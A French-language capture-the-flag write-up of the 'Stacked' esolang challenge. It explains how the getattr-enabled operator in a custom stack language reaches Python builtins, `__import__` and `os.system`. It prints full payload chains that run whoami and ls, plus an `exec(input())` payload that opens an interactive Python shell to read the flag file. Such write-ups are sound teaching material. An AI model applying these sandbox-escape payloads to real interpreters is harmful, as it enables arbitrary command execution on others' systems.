# Stacked

**Auteur :** Shynif
**Difficulté :** Moyen
**Catégorie :** Misc / Esolang

---

## Description

> Vous rencontrez des difficultés avec les deux autres défis esolang ? Pas de souci ! Essayez le mode bac à sable !

Le challenge expose un interpréteur pour un langage ésotérique maison appelé **RELANG**, accessible via une connexion TCP (socat). Le but est d'en sortir pour lire le fichier `a_very_well_hidden_flag.txt` sur le serveur.

---

## Analyse du challenge

### RELANG en quelques mots

RELANG est un langage basé sur une **pile** (stack). Chaque token est séparé par un espace. Les tokens sont soit des opérateurs, soit des regex, soit des entiers.

L'évaluation se fait de droite à gauche : les éléments sont empilés, et les opérateurs consomment les éléments de la pile.
Cependant les éléments du programme sont ajoutés à la pile au fur-et-à-mesure de l'execution du programme.

Les opérateurs clés :

| Symbole | Rôle |
|---------|------|
| `µ`     | Récupère une fonction depuis son nom (ex: `µ str` → fonction `str`) |
| `¤`     | Accès à un attribut ou index (équivalent `getattr` ou `[]`) |
| `@`     | Map : applique un opérateur sur une liste |
| `§`     | Deploy : génère toutes les valeurs possibles d'une regex non-infinie |
| `"`     | Convertit en string |
| `;`     | Identité (skip, renvoie l'élément tel quel) |
| `0`     | Entier 0 (utilisé comme index) |

### Vulnérabilité : `can_getattr=True`

Dans `challenge.py`, l'interpréteur est instancié avec `can_getattr=True` :

```python
Interpreter(query, can_getattr=True)
```

Cela active une fonctionnalité critique dans l'opérateur `¤` :

```python
_get = lambda a,i: a[i] if (hasattr(arr, '__getitem__') or can_getattr==False) else getattr(arr, str(i))
```

Avec `can_getattr=True`, l'opérateur `¤` utilise `getattr()` sur n'importe quel objet Python. Cela nous permet de traverser la hiérarchie des objets Python depuis les builtins.

### Restriction sur `µ`

L'opérateur `µ` ne donne accès qu'à un sous-ensemble de fonctions :

```python
extra_functions = ['abs', 'all', 'any', 'bin', 'bool', ..., 'str', 'sum', ...]
func_globals.update({..., 'Operator', 'Regex'})
```

`__import__` et `exec` ne sont **pas** directement accessibles via `µ`. Mais grâce à `can_getattr=True`, on peut remonter jusqu'au module `builtins` via un attribut d'une fonction accessible.

---

## Exploitation

### Étape 1 : Obtenir une méthode builtin

```
¤ op µ any
```

- `µ any` → récupère la fonction Python `any`
- `¤ op` → `getattr(any, 'op')` … ici on utilise `¤ " __self__` pour accéder au module `builtins`

### Étape 2 : Accéder au module `builtins`

Toute méthode builtin possède un attribut `__self__` qui pointe vers le module `builtins` :

```
¤ " __self__ ¤ op µ any
```

- `µ any` → `any` (fonction builtin)
- `¤ op` → l'objet interne de la fonction `any` (un `builtin_function_or_method`)
- `¤ " __self__` → `getattr(any, '__self__')` → module `builtins`

### Étape 3 : Obtenir `__import__`

```
@ ¤ " __import__ ¤ " __self__ ¤ op µ any
```

- Sur le module `builtins`, on fait `getattr(builtins, '__import__')` → la fonction `__import__`

### Étape 4 : Envelopper dans `Operator` et importer `os`

`µ Operator` donne accès à la classe `Operator` de RELANG, qui peut envelopper n'importe quelle callable Python. On s'en sert pour rendre `__import__` utilisable comme opérateur RELANG :

```
@ ; ¤ 0 @ µ Operator @ ¤ " __import__ ¤ " __self__ ¤ op µ any @ µ str § os
```

Décomposé :
- `§ os` → deploy de la regex `os` → `['os']`
- `@ µ str` → map `str` sur `['os']` → `['os']` (en strings)
- `@ ¤ " __import__ ¤ " __self__ ¤ op µ any` → `[__import__('os')]` → le module `os`
- `¤ 0 @ µ Operator` → `Operator(os)` avec `os[0]` = module `os`
- `@ ;` → applique l'identité : retourne le module `os` utilisable

### Étape 5 : Appeler `os.system`

```
¤ 0 @ µ Operator ¤ 0 @ ¤ system @ ; ¤ 0 @ µ Operator @ ¤ " __import__ ¤ " __self__ ¤ op µ any @ µ str § os
```

- On prend le module `os` (étape précédente)
- `¤ system` → `getattr(os, 'system')` → la fonction `os.system`
- On l'enveloppe dans `Operator`

### Étape 6 : Exécuter une commande

Payload final pour `whoami` :

```
@ ; ¤ 0 @ µ Operator ¤ 0 @ ¤ system @ ; ¤ 0 @ µ Operator @ ¤ " __import__ ¤ " __self__ ¤ op µ any @ µ str § os @ µ str § whoami
```

Reconnaissance (ls) :

```
@ ; ¤ 0 @ µ Operator ¤ 0 @ ¤ system @ ; ¤ 0 @ µ Operator @ ¤ " __import__ ¤ " __self__ ¤ op µ any @ µ str § os @ µ str § ls
```

---

## Bonus : exec libre

Une alternative plus puissante consiste à récupérer `exec` depuis les builtins et l'appeler avec `input()` pour avoir un shell Python interactif :

```
@ ; ¤ 0 @ µ Operator @ ¤ " exec ¤ " __self__ ¤ op µ any @ µ str § exec\(input\(\)\)
```

Une fois ce payload envoyé, on peut taper directement du Python :

```python
__import__('os').system('cat a_very_well_hidden_flag.txt')
```

---

## Flag

```
BZHCTF{...}
```
